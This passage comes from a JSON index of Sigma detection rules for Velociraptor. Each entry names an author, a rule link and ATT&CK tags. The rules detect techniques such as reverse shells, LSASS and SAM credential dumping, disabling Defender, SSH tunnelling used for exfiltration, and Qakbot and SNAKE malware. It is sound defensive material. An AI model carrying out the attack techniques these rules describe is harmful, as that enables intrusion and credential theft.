Launch Via Rundll32.EXE"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of a renamed \"client32.exe\" (NetSupport RAT) via Imphash, Product and OriginalFileName strings", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\remote_administration_tools\\netsupport\\win_renamed_netsupport.yaml", "tags": ["attack.defense_evasion"], "title": "Renamed NetSupport RAT Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of the 'crontab' utility to remove the current crontab.\nThis is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_crontab_removal.yaml", "tags": ["attack.defense_evasion", "os.linux"], "title": "Remove Scheduled Cron Task/Job"}, {"author": "Jakob Weinzettl, oscd.community", "description": "Detects removing immutable file attribute.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_chattr_immutable_removal.yaml", "tags": ["attack.defense_evasion", "attack.t1222.002", "os.linux"], "title": "Remove Immutable File Attribute - Auditd"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of the 'chattr' utility to remove immutable file attribute.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_chattr_immutable_removal.yaml", "tags": ["attack.defense_evasion", "attack.t1222.002", "os.linux"], "title": "Remove Immutable File Attribute"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the creation of a remote thread from a Powershell process in a potentially suspicious target process", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_powershell_susp_targets.yaml", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218.011", "attack.t1059.001", "sysmon", "windows", "evtx", "generic"], "title": "Remote Thread Creation Via PowerShell In Potentially Suspicious Target"}, {"author": "frack113", "description": "Detects a remote thread creation of Ttdinject.exe used as proxy", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_ttdinjec.yaml", "tags": ["attack.defense_evasion", "attack.t1127", "sysmon", "lolbas", "windows", "evtx", "generic"], "title": "Remote Thread Creation Ttdinject.exe Proxy"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects uncommon target processes for remote thread creation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_uncommon_target_image.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055.003", "sysmon", "windows", "evtx", "generic"], "title": "Remote Thread Creation In Uncommon Target Image"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects remote thread creation in the \"mstsc.exe\" process by a process located in a potentially suspicious location.\nThis technique is often used by attackers in order to hook some APIs used by DLLs loaded by \"mstsc.exe\" during RDP authentications in order to steal credentials.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_mstsc_susp_location.yaml", "tags": ["attack.credential_access", "sysmon", "windows", "evtx", "generic"], "title": "Remote Thread Creation In Mstsc.Exe From Suspicious Location"}, {"author": "Perez Diego (@darkquassar), oscd.community", "description": "Detects uncommon processes creating remote threads", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_uncommon_source_image.yaml", "tags": ["attack.privilege_escalation", "attack.defense_evasion", "attack.t1055", "sysmon", "lolbas", "web_exploitation", "windows", "evtx", "generic"], "title": "Remote Thread Creation By Uncommon Source Image"}, {"author": "Timon Hackenjos", "description": "Detects remote thread creation in \"KeePass.exe\" which could indicates potential password dumping activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_keepass.yaml", "tags": ["attack.credential_access", "attack.t1555.005", "sysmon", "windows", "evtx", "generic"], "title": "Remote Thread Created In KeePass.EXE"}, {"author": "Roberto Rodriguez @Cyb3rWard0g, Tim Shelton", "description": "Detects remote PowerShell sessions", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_pm_remote_powershell_session.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.lateral_movement", "attack.t1021.006", "windows", "evtx"], "title": "Remote PowerShell Session (PS Module)"}, {"author": "Roberto Rodriguez @Cyb3rWard0g", "description": "Detects remote PowerShell sessions", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\posh_pc_remote_powershell_session.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.lateral_movement", "attack.t1021.006", "windows", "evtx"], "title": "Remote PowerShell Session (PS Classic)"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal", "description": "Detects the use of tools that copy files from or to remote systems", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_file_copy.yaml", "tags": ["attack.command_and_control", "attack.lateral_movement", "attack.t1105", "os.linux"], "title": "Remote File Copy"}, {"author": "bmcder02", "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\services\\service_win_non_system_service.yaml", "tags": ["attack.command_and_control", "attack.t1219", "attack.persistence", "windows", "windows.services"], "title": "Remote Access Tool Services"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects relevant ClamAV messages", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\clamav\\lnx_clamav_relevant_message.yaml", "tags": ["attack.resource_development", "attack.t1588.001", "os.linux"], "title": "Relevant ClamAV Message"}, {"author": "frack113", "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\registry\\proc_creation_win_reg_dump_sam.yaml", "tags": ["attack.credential_access", "attack.t1003.002", "windows", "evtx"], "title": "Registry Dump of SAM Creds and Secrets"}, {"author": "Florian Roth (Nextron Systems), oscd.community", "description": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\netsh\\proc_creation_win_netsh_port_forwarding_3389.yaml", "tags": ["attack.lateral_movement", "attack.defense_evasion", "attack.command_and_control", "attack.t1090", "windows", "evtx"], "title": "RDP Port Forwarding Rule Added Via Netsh.EXE"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of the Qakbot uninstaller file mentioned in the USAO-CDCA document on the disruption of the Qakbot malware and botnet", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_uninstaller_cleanup_evtx.yaml", "tags": ["detection.emerging_threats", "attack.execution", "windows", "malware.qakbot", "sysmon", "evtx"], "title": "Qakbot Uninstaller Execution - EVTX"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of the Qakbot uninstaller file mentioned in the USAO-CDCA document on the disruption of the Qakbot malware and botnet", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_uninstaller_cleanup.yaml", "tags": ["detection.emerging_threats", "attack.execution", "windows", "malware.qakbot"], "title": "Qakbot Uninstaller Execution"}, {"author": "X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution where the DLL doesn't have the \".dll\" extension. This is often linked with potential Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_fake_dll_execution_evtx.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot", "sysmon", "evtx"], "title": "Qakbot Rundll32 Fake DLL Extension Execution - EVTX"}, {"author": "X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution where the DLL doesn't have the \".dll\" extension. This is often linked with potential Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_fake_dll_execution.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot"], "title": "Qakbot Rundll32 Fake DLL Extension Execution"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_exports_evtx.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot", "evtx", "sysmon"], "title": "Qakbot Rundll32 Exports Execution - EVTX"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_exports.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot"], "title": "Qakbot Rundll32 Exports Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific command line of \"regsvr32\" where the \"calc\" keyword is used in conjunction with the \"/s\" flag. This behavior is often seen used by Qakbot", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_regsvr32_calc_pattern_evtx.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot"], "title": "Qakbot Regsvr32 Calc Pattern - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific command line of \"regsvr32\" where the \"calc\" keyword is used in conjunction with the \"/s\" flag. This behavior is often seen used by Qakbot", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_regsvr32_calc_pattern.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "malware.qakbot"], "title": "Qakbot Regsvr32 Calc Pattern"}, {"author": "Nextron Systems", "description": "Detects python spawning a pretty tty which could be indicative of potential reverse shell activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_python_pty_spawn.yaml", "tags": ["attack.execution", "attack.t1059", "os.linux"], "title": "Python Spawning Pretty TTY"}, {"author": "Sreeman", "description": "Detects potential PwnKit exploitation CVE-2021-4034 in auth logs", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\auth\\lnx_auth_pwnkit_local_privilege_escalation.yaml", "tags": ["attack.privilege_escalation", "attack.t1548.001", "os.linux"], "title": "PwnKit Local Privilege Escalation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects program executions in suspicious non-program folders related to malware or hacking activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_susp_exe_folders.yaml", "tags": ["attack.t1587", "attack.t1584", "attack.resource_development", "os.linux"], "title": "Program Executions in Suspicious Folders"}, {"author": "Florian Roth (Nextron Systems), Modexp, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a process memory dump via \"comsvcs.dll\" using rundll32, covering multiple different techniques (ordinal, minidump function, etc.)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_process_dump_via_comsvcs.yaml", "tags": ["attack.defense_evasion", "attack.credential_access", "attack.t1036", "attack.t1003.001", "car.2013-05-009", "windows", "evtx", "lolbas"], "title": "Process Memory Dump Via Comsvcs.DLL"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.\nInformation obtained could be used to gain an understanding of common software/applications running on systems within the network\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_process_discovery.yaml", "tags": ["attack.discovery", "attack.t1057", "os.linux"], "title": "Process Discovery"}, {"author": "Pawel Mazur", "description": "Detects the addition of a new user to a privileged group such as \"root\" or \"sudo\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_privileged_user_creation.yaml", "tags": ["attack.persistence", "attack.t1136.001", "attack.t1098", "os.linux"], "title": "Privileged User Has Been Created"}, {"author": "Tim Rauch", "description": "Detects a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\named_pipe\\proc_creation_win_susp_priv_escalation_via_named_pipe.yaml", "tags": ["attack.lateral_movement", "attack.t1021", "windows", "evtx"], "title": "Privilege Escalation via Named Pipe Impersonation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_history_recon.yaml", "tags": ["attack.reconnaissance", "attack.t1592.004", "os.linux"], "title": "Print History File Contents"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects requests to disable Microsoft Defender features using PowerShell commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\process_creation_powershell_disable_defender.yaml", "tags": ["attack.defense_evasion", "attack.t1562.001", "windows", "evtx"], "title": "Powershell Defender Disable Scan Feature"}, {"author": "oscd.community, Natalia Shornikova", "description": "Detects powershell script installed as a Service", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\services\\win_powershell_service_evtx_security.yaml", "tags": ["attack.execution", "attack.t1569.002", "attack.privilege_escalation", "attack.persistence", "windows", "evtx"], "title": "PowerShell Scripts Installed as Services - Security"}, {"author": "oscd.community, Natalia Shornikova", "description": "Detects powershell script installed as a Service", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\services\\win_powershell_service.yaml", "tags": ["attack.execution", "attack.t1569.002", "attack.privilege_escalation", "attack.persistence", "windows", "windows.services"], "title": "PowerShell Scripts Installed as Services"}, {"author": "oscd.community, Natalia Shornikova", "description": "Detects powershell script installed as a Service", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\services\\win_powershell_service_evtx.yaml", "tags": ["attack.execution", "attack.t1569.002", "attack.privilege_escalation", "attack.persistence", "windows", "evtx"], "title": "PowerShell Scripts Installed as Services"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\win_powershell_iex_cmdlets.yaml", "tags": ["attack.execution", "attack.t1059.001"], "title": "PowerShell Base64 Encoded IEX Cmdlet"}, {"author": "Micah Babinski", "description": "Detects possible execution via LNK file accessed on a WebDAV server.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webdav_lnk_execution.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.t1204", "windows", "evtx", "webserver.webdav"], "title": "Potentially Suspicious WebDAV LNK Execution"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects the creation of shell scripts under the \"profile.d\" path.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_susp_shell_script_under_profile_directory.yaml", "tags": ["attack.persistence", "os.linux"], "title": "Potentially Suspicious Shell Script Creation in Profile Folder"}, {"author": "juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_susp_activity.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Potentially Suspicious Rundll32 Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a new named pipe using the \"mkfifo\" utility in a potentially suspicious location", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yaml", "tags": ["attack.execution", "os.linux"], "title": "Potentially Suspicious Named Pipe Created Via Mkfifo"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects a potentially suspicious execution of a process located in the '/tmp/' folder", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_execution_tmp_folder.yaml", "tags": ["attack.defense_evasion", "attack.t1036", "os.linux"], "title": "Potentially Suspicious Execution From Tmp Folder"}, {"author": "Bhabesh Raj, X__Junior (Nextron Systems)", "description": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\compression\\cab\\compession_win_suspicious_cab_expand.yaml", "tags": ["attack.execution", "attack.t1218", "windows", "evtx"], "title": "Potentially Suspicious Cabinet File Expansion"}, {"author": "Bhabesh Raj, X__Junior (Nextron Systems)", "description": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\compression\\cab\\pslist_compession_win_suspicious_cab_expand.yaml", "tags": ["attack.execution", "attack.t1218", "windows", "evtx"], "title": "Potentially Suspicious Cabinet File Expansion"}, {"author": "Bhabesh Raj, X__Junior (Nextron Systems)", "description": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\compression\\cab\\sysmon_compession_win_suspicious_cab_expand.yaml", "tags": ["attack.execution", "attack.t1218", "windows", "evtx", "sysmon"], "title": "Potentially Suspicious Cabinet File Expansion"}, {"author": "Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)", "description": "Detects process handle on LSASS process with certain access mask", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\lsass\\win_sus_lsass_accessmask.yaml", "tags": ["attack.credential_access", "car.2019-04-004", "attack.t1003.001", "windows", "evtx"], "title": "Potentially Suspicious AccessMask Requested From LSASS"}, {"author": "@d4ns4n_", "description": "Detects usage of \"xterm\" as a potential reverse shell tunnel", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_xterm_reverse_shell.yaml", "tags": ["attack.execution", "attack.t1059", "os.linux"], "title": "Potential Xterm Reverse Shell"}, {"author": "pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport", "description": "Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_reg_rdp_keys_tamper.yaml", "tags": ["attack.defense_evasion", "attack.lateral_movement", "attack.t1021.001", "attack.t1112", "windows", "evtx"], "title": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential suspicious child processes of \"3CXDesktopApp.exe\". Which could be related to the 3CXDesktopApp supply chain compromise", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_susp_children_evtx.yaml", "tags": ["attack.command_and_control", "attack.execution", "attack.t1218", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Suspicious Child Process Of 3CXDesktopApp - Sysmon"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential suspicious child processes of \"3CXDesktopApp.exe\". Which could be related to the 3CXDesktopApp supply chain compromise", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_susp_children.yaml", "tags": ["attack.command_and_control", "attack.execution", "attack.t1218", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Suspicious Child Process Of 3CXDesktopApp"}, {"author": "@d4ns4n_ (Wuerth-Phoenix)", "description": "Detects changes of sensitive and critical files. Monitors files that you don't expect to change without planning on Linux system.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_sensitive_file_access.yaml", "tags": ["attack.impact", "attack.t1565.001", "os.linux"], "title": "Potential Suspicious Change To Sensitive/Critical Files"}, {"author": "Red Canary (idea), Nasreddine Bencherchali", "description": "Detects the presence of \"bpf_probe_write_user\" BPF helper-generated warning messages. Which could be a sign of suspicious eBPF activity on the system.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_potential_susp_ebpf_activity.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "os.linux"], "title": "Potential Suspicious BPF Activity - Linux"}, {"author": "Dusty Miller", "description": "Detects a DNS query initiated from a \"wscript\" process for domains matching a specific pattern that was seen being used by SocGholish for its Command and Control traffic", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\dns_query_win_malware_socgholish_second_stage_c2.yaml", "tags": ["attack.command_and_control", "attack.t1219", "detection.emerging_threats"], "title": "Potential SocGholish Second Stage C2 DNS Query"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_shelldispatch_potential_abuse.yaml", "tags": ["attack.execution", "attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Potential ShellDispatch.DLL Functionality Abuse"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific child/parent process relationship indicative of a \"WerFault\" process running from the \"WinSxS\" as a service. This could be indicative of potential SNAKE malware activity as reported by CISA.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_service_execution_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "evtx", "sysmon"], "title": "Potential SNAKE Malware Persistence Service Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific child/parent process relationship indicative of a \"WerFault\" process running from the \"WinSxS\" as a service. This could be indicative of potential SNAKE malware activity as reported by CISA.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_service_execution.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake"], "title": "Potential SNAKE Malware Persistence Service Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_installer_cli_args_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "sysmon", "evtx"], "title": "Potential SNAKE Malware Installation CLI Arguments Indicator - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_installer_cli_args.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake"], "title": "Potential SNAKE Malware Installation CLI Arguments Indicator"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific binary name seen used by SNAKE malware during its installation as described by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_installer_exec_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "evtx", "sysmon"], "title": "Potential SNAKE Malware Installation Binary Indicator - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a specific binary name seen used by SNAKE malware during its installation as described by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\proc_creation_win_malware_snake_installer_exec.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake"], "title": "Potential SNAKE Malware Installation Binary Indicator"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\proc_creation_win_hktl_relay_attacks_tools.yaml", "tags": ["attack.execution", "attack.t1557.001", "windows", "evtx", "potato"], "title": "Potential SMB Relay Attack Tool Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_proc_creation_win_hktl_relay_attacks_tools.yaml", "tags": ["attack.execution", "attack.t1557.001", "sysmon", "windows", "evtx", "potato"], "title": "Potential SMB Relay Attack Tool Execution"}, {"author": "Harjot Singh, '@cyb3rjy0t'", "description": "Detects execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS).", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_ads_stored_dll_execution.yaml", "tags": ["attack.defense_evasion", "attack.t1564.004", "windows", "evtx", "lolbas"], "title": "Potential Rundll32 Execution With DLL Stored In ADS"}, {"author": "@d4ns4n_", "description": "Detects execution of ruby with the \"-e\" flag and calls to \"socket\" related functions. This could be an indication of a potential attempt to setup a reverse shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_ruby_reverse_shell.yaml", "tags": ["attack.execution", "os.linux"], "title": "Potential Ruby Reverse Shell"}, {"author": "Tim Rauch", "description": "Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\ssh\\proc_creation_win_susp_remote_desktop_tunneling.yaml", "tags": ["attack.lateral_movement", "attack.t1021", "windows", "evtx"], "title": "Potential Remote Desktop Tunneling"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\ssh\\proc_creation_win_ssh_rdp_tunneling.yaml", "tags": ["attack.command_and_control", "attack.t1572", "windows", "evtx"], "title": "Potential RDP Tunneling Via SSH"}, {"author": "@juju4", "description": "Detects potential RDP Session Hijacking activity on Windows systems", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_tscon_rdp_session_hijacking.yaml", "tags": ["attack.execution", "attack.lateral_movement", "windows", "evtx"], "title": "Potential RDP Session Hijacking Activity"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution often linked with potential Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_execution_evtx.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "evtx", "sysmon", "malware.qakbot"], "title": "Potential Qakbot Rundll32 Execution - EVTX"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects specific process tree behavior of a \"rundll32\" execution often linked with potential 